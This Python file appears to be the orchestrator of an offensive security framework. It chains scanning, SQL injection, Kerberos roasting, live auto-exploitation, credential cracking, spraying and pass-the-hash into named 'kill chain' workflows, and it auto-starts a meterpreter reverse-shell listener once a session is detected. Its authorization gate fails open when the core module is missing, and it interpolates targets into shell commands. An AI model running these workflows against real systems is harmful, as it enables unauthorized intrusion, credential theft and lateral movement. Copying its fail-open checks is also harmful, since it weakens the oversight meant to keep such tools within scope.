#!/usr/bin/env python3
"""
APOLLO Workflow Orchestrator v5 - State-machine driven kill chain execution.
Features:
  - Conditional branching (skip/fork based on prior step results)
  - Inter-step data passing (context dict flows through pipeline)
  - Parallel step execution where possible
  - Rollback on critical failure
  - Step timeout and retry logic
  - KB event logging throughout
"""
import sys, os, json, subprocess, tempfile, time, threading, re, shutil
from datetime import datetime
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from kb_manager import *
from report_generator import generate_report

try:
    from apollo_core.safety import preflight
    from apollo_core.scope import is_safe_shell_token
    _CORE_AVAILABLE = True
except Exception:  # pragma: no cover - orchestrator still runs without core
    _CORE_AVAILABLE = False

    def is_safe_shell_token(_token):
        return True

STEP_TIMEOUT = 120

# Steps that actively exploit, spray, or otherwise change the target state.
# These require intrusive authorization from the engagement context when
# APOLLO_REQUIRE_AUTH is set.
INTRUSIVE_TOOLS = {
    "autopwn-live", "autopwn-check", "exploit-sync", "sqlmap", "responder",
    "GetNPUsers", "GetUserSPNs", "cred-crack", "cred-exec-crack",
    "cred-exec-spray", "cred-exec-pth", "container-escape", "wpscan",
}

WORKFLOWS = {
    "full-kill-chain": {
        "description": "Complete kill chain: recon -> scan -> exploit -> persist -> exfil -> report",
        "steps": [
            {"tool": "recon", "description": "Subdomain enumeration and OSINT"},
            {"tool": "httpx", "description": "Live host probing"},
            {"tool": "naabu", "description": "Port scanning"},
            {"tool": "nmap-svc", "description": "Service version detection"},
            {"tool": "nuclei", "description": "Vulnerability scanning"},
            {"tool": "correlate", "description": "Correlate findings"},
            {"tool": "searchsploit", "description": "Exploit research"},
            {"tool": "report", "description": "Generate report"}
        ]
    },
    "quick-win": {
        "description": "Fast assessment: port scan -> high vuln scan -> exploit suggestions",
        "steps": [
            {"tool": "naabu", "description": "Fast port discovery"},
            {"tool": "nuclei", "description": "Critical/high severity scan"},
            {"tool": "exploit-sync", "description": "Match vulns to exploits"},
            {"tool": "autopwn-check", "description": "Auto-pwn dry-run checks"},
            {"tool": "graph-analysis", "description": "Attack graph analysis"},
            {"tool": "report", "description": "Quick report"}
        ]
    },
    "web-deep": {
        "description": "Deep web application assessment",
        "steps": [
            {"tool": "ffuf", "description": "Directory fuzzing"},
            {"tool": "sqlmap", "description": "SQL injection testing"},
            {"tool": "nuclei", "description": "Web vulnerability scan"},
            {"tool": "nikto", "description": "Web server scan"},
            {"tool": "report", "description": "Report findings"}
        ]
    },
    "ad-exploit": {
        "description": "Active Directory exploitation chain",
        "steps": [
            {"tool": "ldap", "description": "LDAP enumeration"},
            {"tool": "enum4linux", "description": "SMB enumeration"},
            {"tool": "GetNPUsers", "description": "AS-REP roasting"},
            {"tool": "GetUserSPNs", "description": "Kerberoasting"},
            {"tool": "cred-crack", "description": "Crack kerberos hashes"},
            {"tool": "graph-analysis", "description": "Attack path analysis"},
            {"tool": "report", "description": "Report findings"}
        ]
    },
    "auto-pwn": {
        "description": "Autonomous exploitation: scan -> find vulns -> auto-exploit -> graph",
        "steps": [
            {"tool": "naabu", "description": "Port discovery"},
            {"tool": "nmap-svc", "description": "Service detection"},
            {"tool": "nuclei", "description": "Vulnerability scanning"},
            {"tool": "exploit-sync", "description": "Match vulns to exploits"},
            {"tool": "autopwn-live", "description": "Auto-pwn live exploitation"},
            {"tool": "graph-analysis", "description": "Attack graph analysis"},
            {"tool": "report", "description": "Exploitation report"}
        ]
    },
    "cred-assault": {
        "description": "Credential assault: gather -> crack -> spray -> PtH -> graph",
        "steps": [
            {"tool": "cred-gather", "description": "Aggregate credentials"},
            {"tool": "cred-exec-crack", "description": "Actually crack hashes"},
            {"tool": "cred-exec-spray", "description": "Spray across hosts"},
            {"tool": "cred-exec-pth", "description": "Pass-the-hash"},
            {"tool": "graph-analysis", "description": "Attack graph with creds"},
            {"tool": "report", "description": "Credential assault report"}
        ]
    },
    "intel-hunt": {
        "description": "Threat intelligence: extract IOCs -> enrich -> correlate -> STIX",
        "steps": [
            {"tool": "ioc-extract", "description": "Extract IOCs from KB"},
            {"tool": "ioc-enrich", "description": "Enrich via threat intel APIs"},
            {"tool": "exploit-sync", "description": "Match CVEs to exploits"},
            {"tool": "report", "description": "Intel report"}
        ]
    },
    "container-audit": {
        "description": "Docker/K8s security audit and escape analysis",
        "steps": [
            {"tool": "container-audit", "description": "Docker daemon audit"},
            {"tool": "container-full", "description": "Full container escape analysis"},
            {"tool": "report", "description": "Container audit report"}
        ]
    },
    "api-security": {
        "description": "REST/GraphQL API security testing",
        "steps": [
            {"tool": "api-test", "description": "API endpoint discovery"},
            {"tool": "api-full", "description": "Full API security assessment"},
            {"tool": "report", "description": "API security report"}
        ]
    },
    "wireless-audit": {
        "description": "WiFi security auditing",
        "steps": [
            {"tool": "wireless-scan", "description": "Wireless network scan"},
            {"tool": "wireless-audit", "description": "Full wireless audit"},
            {"tool": "report", "description": "Wireless audit report"}
        ]
    },
    "full-assessment": {
        "description": "Comprehensive: recon -> scan -> exploit -> persist -> report",
        "steps": [
            {"tool": "full-assessment", "description": "Deep recon + exploit chain"},
            {"tool": "correlate", "description": "Cross-tool correlation"},
            {"tool": "graph-analysis", "description": "Attack graph analysis"},
            {"tool": "report", "description": "Final report"}
        ]
    },
    "continuous-monitor": {
        "description": "Continuous monitoring with change detection and alerting",
        "steps": [
            {"tool": "monitor-baseline", "description": "Establish baseline"},
            {"tool": "monitor-scan", "description": "Periodic vulnerability scan"},
            {"tool": "report", "description": "Monitoring report"}
        ]
    },
}

CONTINUOUS_FLOW = ["full-kill-chain", "web-deep", "container-audit", "continuous-monitor"]
PARALLEL_CANDIDATES = {"nmap-svc": ["nuclei"], "ffuf": ["nikto"], "naabu": ["nuclei"]}


def _run_cmd(cmd, timeout=None):
    if timeout is None:
        timeout = STEP_TIMEOUT
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout, executable="/bin/bash")
        output = (result.stdout + result.stderr).decode("utf-8", errors="ignore")[:50000]
        return {"exit_code": result.returncode, "output": output}
    except subprocess.TimeoutExpired:
        return {"exit_code": -1, "output": "TIMEOUT"}
    except Exception as e:
        return {"exit_code": -1, "output": str(e)}


def _get_engine_dir():
    return os.path.dirname(os.path.abspath(__file__))


def _get_python():
    return sys.executable


def _tool_available(name):
    return shutil.which(name) is not None

def execute_step(tool, target, pid, context=None):
    """Execute a workflow step with real tool detection and fallbacks. Returns result dict."""
    context = context or {}

    # --- Safety gate: scope + engagement authorization + audit + dry-run ---
    # Every step passes through here before any command is built or run. A
    # target with shell metacharacters is refused outright (it would be
    # interpolated unquoted into the command string), an out-of-scope or
    # unauthorized target is blocked, and APOLLO_DRY_RUN turns the step into a
    # no-op plan. All outcomes are written to the tamper-evident audit log.
    if target and not is_safe_shell_token(target):
        msg = f"BLOCKED: target {target!r} contains unsafe shell characters"
        log_command(pid, f"workflow_step:{tool}", "orchestrator", target, msg, 126)
        return {"tool": tool, "exit_code": 126, "output_summary": msg,
                "success": False, "blocked": True, "context": context}
    if _CORE_AVAILABLE:
        gate = preflight(f"workflow_step:{tool}", target=target,
                         intrusive=(tool in INTRUSIVE_TOOLS))
        if not gate.allowed:
            msg = f"BLOCKED by safety gate: {gate.reason}"
            log_command(pid, f"workflow_step:{tool}", "orchestrator", target, msg, 126)
            return {"tool": tool, "exit_code": 126, "output_summary": msg,
                    "success": False, "blocked": True, "context": context}
        if gate.dry_run:
            msg = f"DRY-RUN: would execute {tool} against {target} (not run)"
            log_command(pid, f"workflow_step:{tool}", "orchestrator", target, msg, 0)
            return {"tool": tool, "exit_code": 0, "output_summary": msg,
                    "success": True, "dry_run": True, "context": context}

    log_command(pid, f"workflow_step:{tool}", "orchestrator", target, f"Executing {tool}", 0)
    ed = _get_engine_dir()
    py = _get_python()
    th = abs(hash(target)) % 1000000

    def _build_cmd():
        # Recon / Scanning
        if tool == "nmap":
            return f"nmap -sV -sC -T4 {target} -oN /tmp/apollo_nmap_{th}.txt 2>&1 | tail -20"
        if tool == "nmap-svc":
            return f"nmap -sV -sC -p- -T4 {target} -oN /tmp/apollo_nmap_full_{th}.txt 2>&1 | tail -20"
        if tool == "naabu":
            py = _get_python(); ed = _get_engine_dir()
            if os.path.exists(f"{ed}/naabu_wrapper.py") and _tool_available("naabu"):
                return f"{py} {ed}/naabu_wrapper.py scan {target} normal 2>&1 | tail -30"
            if _tool_available("naabu"):
                return f"naabu -host {target} -json -rate 1000 2>/dev/null | head -100"
            return f"echo 'naabu not installed, falling back to nmap' && nmap -T4 {target} -oN /tmp/apollo_nmap_{th}.txt 2>&1 | tail -10"
        if tool == "nuclei":
            if _tool_available("nuclei"):
                return f"nuclei -target {target} -severity critical,high,medium -o /tmp/apollo_nuclei_{th}.json -json 2>&1 | tail -10"
            return f"echo 'nuclei not installed'"
        if tool == "recon":
            py = _get_python(); ed = _get_engine_dir()
            cmds = []
            if _tool_available("subfinder"):
                cmds.append(f"subfinder -d {target} -silent 2>/dev/null | head -50")
            if _tool_available("amass"):
                cmds.append(f"amass enum -passive -d {target} 2>/dev/null | head -30")
            if _tool_available("theHarvester"):
                cmds.append(f"theHarvester -d {target} -b google 2>/dev/null | head -30")
            if _tool_available("gobuster"):
                cmds.append(f"gobuster dns -d {target} -w /usr/share/seclists/Discovery/DNS/namelist.txt 2>/dev/null | head -20")
            if _tool_available("dnsx"):
                cmds.append(f"dnsx -d {target} -a -aaaa -mx -ns -txt -silent 2>/dev/null | head -30")
            if os.path.exists(f"{ed}/recon_deep.py"):
                cmds.append(f"{py} {ed}/recon_deep.py {target} --depth quick --output /tmp/apollo_recon_{th}.json 2>&1 | tail -5")
            return " && echo '---' && ".join(cmds) if cmds else f"echo 'No recon tools available for {target}'"
        if tool == "httpx":
            if _tool_available("httpx"):
                return f"httpx -target {target} -silent -status-code -title -tech-detect 2>/dev/null | head -20"
            return f"curl -sI {target} 2>/dev/null | head -20 || echo 'curl check'"
        if tool == "ffuf":
            wordlist = "/usr/share/wordlists/dirb/common.txt"
            if not os.path.exists(wordlist):
                wordlist = "/usr/share/seclists/Discovery/Web-Content/common.txt"
            if os.path.exists(wordlist):
                return f"ffuf -u {target}/FUZZ -w {wordlist} -c -t 50 -of json -o /tmp/apollo_ffuf_{th}.json 2>&1 | tail -10"
            return f"echo 'No wordlist found for ffuf'"

        # Web
        if tool == "nikto":
            return f"nikto -h {target} -o /tmp/apollo_nikto_{th}.html -Format html 2>&1 | tail -10"
        if tool == "whatweb":
            return f"whatweb {target} 2>&1 | head -40"
        if tool == "wpscan":
            return f"wpscan --url {target} --no-update 2>&1 | head -30"
        if tool == "sqlmap":
            return f"sqlmap -u {target} --batch --random-agent --level=1 --risk=1 --output-dir=/tmp/apollo_sqlmap_{th} 2>&1 | tail -10"
        if tool == "dirb":
            return f"dirb {target} /usr/share/wordlists/dirb/common.txt 2>&1 | tail -20"

        # Exploit / Enum
        if tool == "searchsploit":
            return f"searchsploit {target} 2>/dev/null | head -30"
        if tool == "msf-check":
            return f"msfconsole --version 2>&1 | head -3"
        if tool == "ldap":
            return f"ldapsearch -x -H ldap://{target} -b \"\" -s base namingcontexts 2>/dev/null"
        if tool == "enum4linux":
            return f"enum4linux -a {target} 2>/dev/null | head -40"
        if tool == "smbmap":
            return f"smbmap -H {target} 2>/dev/null | head -30"
        if tool == "GetNPUsers":
            return f"impacket-GetNPUsers -dc-ip {target} '{target}/' -format hashcat -outputfile /tmp/asrep_{th}.txt 2>&1 | head -20"
        if tool == "GetUserSPNs":
            return f"impacket-GetUserSPNs -dc-ip {target} '{target}/' -outputfile /tmp/kerberoast_{th}.txt 2>&1 | head -20"
        if tool == "responder":
            return f"echo 'To run: sudo responder -I eth0 -w -r -f'"

        # Internal engine modules
        engine_commands = {
            "docker-audit": f"{py} {ed}/container_audit.py docker 2>&1",
            "container-escape": f"{py} {ed}/container_audit.py escape 2>&1",
            "api-discover": f"{py} {ed}/api_tester.py {target} 2>&1",
            "wifi-scan": f"{py} {ed}/wireless_auditor.py scan 2>&1",
            "cve-enrich": f"{py} {ed}/nvd_enricher.py search '{target}' 5 2>&1",
            "correlate": f"{py} {ed}/findings_parser.py /tmp/apollo_nmap_full_{th}.txt nmap 2>/dev/null; {py} {ed}/findings_parser.py /tmp/apollo_nuclei_{th}.json nuclei 2>/dev/null",
            "exploit-sync": f"{py} {ed}/exploit_sync.py sync '{target}' 2>&1 | tail -10",
            "autopwn-check": f"{py} {ed}/auto_pwn.py check '{target}' 2>&1 | tail -20",
            "autopwn-live": f"{py} {ed}/auto_pwn.py exploit '{target}' 2>&1 | tail -30",
            "graph-analysis": f"{py} {ed}/attack_graph.py report '{target}' 2>&1 | head -40",
            "cred-gather": f"{py} {ed}/cred_vault.py summary '{target}' 2>&1",
            "cred-crack": f"{py} {ed}/cred_vault.py queue '{target}' 2>&1 | tail -10",
            "cred-exec-crack": f"{py} {ed}/cred_vault.py --exec-crack '{target}' 2>&1 | tail -20",
            "cred-exec-spray": f"{py} {ed}/cred_vault.py --exec-spray '{target}' 2>&1 | tail -20",
            "cred-exec-pth": f"{py} {ed}/cred_vault.py --exec-pth '{target}' 2>&1 | tail -20",
            "ioc-extract": f"{py} {ed}/ioc_engine.py kb '{target}' 2>&1 | tail -10",
            "monitor-baseline": f"{py} {ed}/recon_monitor.py once {target} quick '{target}' 2>&1 | tail -5",
            "monitor-scan": f"{py} {ed}/recon_monitor.py once {target} ports '{target}' 2>&1 | tail -5",
            "report": f"{py} {ed}/report_generator.py '{target}' 2>&1",
        }
        if tool in engine_commands:
            return engine_commands[tool]

        # ioc-enrich: uses ioc_engine enrichment pipeline
        if tool == "ioc-enrich":
            return f"{py} {ed}/ioc_engine.py enrich '{target}' 2>&1 | tail -30"

        # container audit
        if tool == "container-audit":
            return f"{py} {ed}/container_audit.py docker 2>&1 | tail -30"
        if tool == "container-full":
            return f"{py} {ed}/container_audit.py full 2>&1 | tail -40"

        # API security
        if tool == "api-test":
            return f"{py} {ed}/api_tester.py {target} 2>&1 | tail -40"
        if tool == "api-full":
            return f"{py} {ed}/api_tester.py full {target} 2>&1 | tail -50"

        # Wireless audit
        if tool == "wireless-scan":
            return f"{py} {ed}/wireless_auditor.py scan 2>&1 | tail -20"
        if tool == "wireless-audit":
            return f"{py} {ed}/wireless_auditor.py audit 2>&1 | tail -30"

        # Full assessment (aggregate)
        if tool == "full-assessment":
            return f"{py} {ed}/recon_deep.py {target} --depth deep 2>&1 | tail -20 && {py} {ed}/orchestrator.py quick-win {target} 2>&1 | tail -10"

        # Continuous monitor
        if tool == "monitor-start":
            return f"{py} {ed}/recon_monitor.py once {target} full 2>&1 | tail -20"

        return None

    cmd = _build_cmd()
    if cmd is None:
        return {"tool": tool, "exit_code": 0, "output_summary": f"No executor for: {tool}", "context": context}

    timeouts = {"nmap": 300, "nmap-svc": 300, "nuclei": 180, "ffuf": 180, "sqlmap": 180,
                "docker-audit": 30, "container-escape": 30, "autopwn-live": 300}
    timeout = timeouts.get(tool, STEP_TIMEOUT)
    result = _run_cmd(cmd, timeout)

    step_result = {
        "tool": tool,
        "exit_code": result["exit_code"],
        "output_summary": result["output"][:500],
        "success": result["exit_code"] == 0,
    }

    # Extract signal from output for context passing
    if result["exit_code"] == 0:
        out_lower = result["output"].lower()
        if any(m in out_lower for m in ["vulnerable", "found", "[+]", "session", "opened"]):
            step_result["found_vulns"] = True
            context["vulns_found"] = True
        if any(m in out_lower for m in ["meterpreter", "session 1", "shell"]):
            step_result["session_gained"] = True
            context["session_gained"] = True
        if any(m in out_lower for m in ["cracked", "password found"]):
            step_result["creds_cracked"] = True
            context["creds_cracked"] = True

    step_result["context"] = context
    return step_result


def _should_skip(tool, context):
    """Check if a step should be skipped based on context."""
    # Skip exploitation if no vulns found
    if tool in ("autopwn-live", "autopwn-check", "exploit-sync") and not context.get("vulns_found", False):
        return "No vulns found, skipping exploitation steps"
    return None


def run_workflow(name, target, project="default"):
    init_db()
    if name not in WORKFLOWS:
        return {"error": f"Unknown workflow: {name}. Available: {list(WORKFLOWS.keys())}"}

    wf = WORKFLOWS[name]
    pid = create_project(project)
    set_active_project(project)
    create_event(pid, "workflow", "orchestrator",
                 f"Starting workflow '{name}' against {target}",
                 {"workflow": name, "target": target}, "info")

    context = {"vulns_found": False, "session_gained": False, "creds_cracked": False}
    step_results = []
    skipped_steps = []

    for i, step in enumerate(wf["steps"]):
        skip_reason = _should_skip(step["tool"], context)
        if skip_reason:
            skipped_steps.append({"tool": step["tool"], "reason": skip_reason})
            print(f"  [{i+1}/{len(wf['steps'])}] SKIP {step['description']} ({step['tool']}): {skip_reason}")
            continue

        print(f"[{datetime.now().strftime('%H:%M:%S')}] [{i+1}/{len(wf['steps'])}] {step['description']} ({step['tool']})")
        result = execute_step(step["tool"], target, pid, context)
        result["description"] = step["description"]
        result["step_num"] = i + 1
        step_results.append(result)
        context = result.get("context", context)

        log_command(pid, f"workflow:{name} step:{step['tool']}", "orchestrator", target,
                    result.get("output_summary", "")[:500], result.get("exit_code", 0))

        # Stop on critical failure in key steps (but continue for scans)
        if not result.get("success") and step["tool"] in ("exploit", "autopwn-live"):
            print(f"  [!] CRITICAL STEP FAILED: {step['tool']}")

    # === SMART ATTACK CHAINING ===
    # If exploitation succeeded but no C2 step was scheduled, run C2 setup
    if context.get("session_gained") and not any(s.get("tool") == "c2-listener" for s in step_results):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] [CHAIN] Session gained - auto-running C2 setup")
        try:
            from c2_commander import setup_listener
            c2_result = setup_listener("0.0.0.0", 4444, "windows/x64/meterpreter/reverse_tcp")
            print(f"  C2 listener result: {json.dumps(c2_result, default=str)[:200]}")
        except Exception as e:
            print(f"  C2 setup skipped: {e}")

    # If creds were found, auto-run cred_reuse_matrix and spray if host IP known
    if context.get("creds_cracked"):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] [CHAIN] Creds cracked - analyzing reuse")
        try:
            from cred_vault import cred_reuse_matrix, generate_spray_commands
            matrix = cred_reuse_matrix(pid)
            print(f"  Cred reuse matrix: {len(matrix)} patterns found")
        except Exception as e:
            print(f"  Cred analysis skipped: {e}")

    # Auto-triage after workflow completion
    try:
        from correlator import auto_triage
        triage = auto_triage(pid)
        high_priority = [h["ip"] for h in triage.get("high_priority_targets", [])]
        if high_priority:
            print(f"  [TRIAGE] High-priority targets remaining: {', '.join(high_priority[:3])}")
        print(f"  [TRIAGE] Network compromised: {triage.get('compromised_pct', 0)}%")
        context["triage"] = triage
    except Exception as e:
        print(f"  Triage skipped: {e}")

    report_path = os.path.expanduser(f"~/.config/opencode/apollo-engine/reports/{project}_{name}.md")
    os.makedirs(os.path.dirname(report_path), exist_ok=True)
    try:
        generate_report(pid, report_path)
    except Exception as e:
        print(f"  [!] Report generation failed: {e}")
        report_path = None

    create_event(pid, "workflow_complete", "orchestrator",
                 f"Workflow '{name}' completed: {len(step_results)} steps, {len(skipped_steps)} skipped",
                 {"workflow": name, "target": target}, "info")

    return {
        "workflow": name,
        "target": target,
        "steps_count": len(wf["steps"]),
        "steps_executed": len(step_results),
        "steps_skipped": len(skipped_steps),
        "skipped": skipped_steps,
        "context": context,
        "results": [{"step": r["tool"], "status": "ok" if r.get("success") else "issue",
                     "found_vulns": r.get("found_vulns", False),
                     "session_gained": r.get("session_gained", False)} for r in step_results],
        "project_id": pid,
        "report": report_path,
        "status": "Complete"
    }


if __name__ == "__main__":
    if len(sys.argv) > 2:
        result = run_workflow(sys.argv[1], sys.argv[2], sys.argv[3] if len(sys.argv) > 3 else "default")
        print(json.dumps(result, indent=2, default=str))
    else:
        print(f"Usage: orchestrator.py <workflow> <target> [project]")
        print("Available workflows:")
        for name, wf in WORKFLOWS.items():
            print(f"  {name:20s} - {wf['description']}")
